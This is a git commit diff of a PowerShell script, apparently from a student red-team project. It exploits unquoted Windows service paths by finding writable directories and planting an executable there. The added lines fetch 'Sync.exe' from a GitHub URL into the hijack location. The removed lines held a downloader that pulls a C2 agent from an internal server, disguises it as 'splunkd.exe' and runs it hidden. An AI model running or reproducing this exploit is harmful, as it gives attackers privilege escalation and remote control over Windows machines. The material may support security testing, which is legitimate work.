482341658f560a0ba7fe62280b3e55c7a7a6daa1
prince-spooler <132440531+prince-spooler@users.noreply.github.com>
2023-05-17 20:37:15 +0800

    Update Unquoted-service-path-test-1.ps1

--- Unquoted-service-path-test-1.ps1
+++ Unquoted-service-path-test-1.ps1
@@ -1,3 +1,6 @@
+[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
+$apiUrl = "https://github.com/prince-spooler/FYP/raw/main/Sync.exe"
+
 # Retrieve and save service paths
 $ErrorActionPreference = "SilentlyContinue"
 $svclist = Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\services | ForEach-Object {Get-ItemProperty $_.PsPath}
@@ -13,20 +16,6 @@ ForEach ($svc in $svclist) {
 
 # Traverse and identify writable directory
 foreach ($path in $servicePaths) {
-    $commands = @"
-$server="http://172.16.172.16:8888"
-$url="$server/file/download"
-$wc=New-Object System.Net.WebClient
-$wc.Headers.add("platform","windows")
-$wc.Headers.add("file","sandcat.go")
-$data=$wc.DownloadData($url)
-get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f
-rm -force "C:\Users\Public\splunkd.exe" -ea ignore
-[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
-Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden
-Get-Process
-"@
-
     $parentDir = Split-Path -Path $path -Parent
     $dirName = ($path -split "\\")[-2]
 
@@ -41,11 +30,12 @@ Get-Process
                 Set-Location $parentParentDir
                 $words = $dirName -split "\s+"
                 $fileName = $words[0] + ".exe"
-                $commands | Out-File -FilePath $fileName -Encoding ASCII -NoClobber
+                Invoke-WebRequest -Uri $apiUrl -OutFile $fileName -ErrorAction SilentlyContinue
+
                 # If the service is not running, restart the system
                 $svcStatus = Get-Service -DisplayName "TRIGONE Remote System Monitor Service" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Status
                 if ($svcStatus -ne "Running") {
-              #      Restart-Computer -Force -ErrorAction SilentlyContinue
+                    # Restart-Computer -Force -ErrorAction SilentlyContinue
                 }
                 break
             }
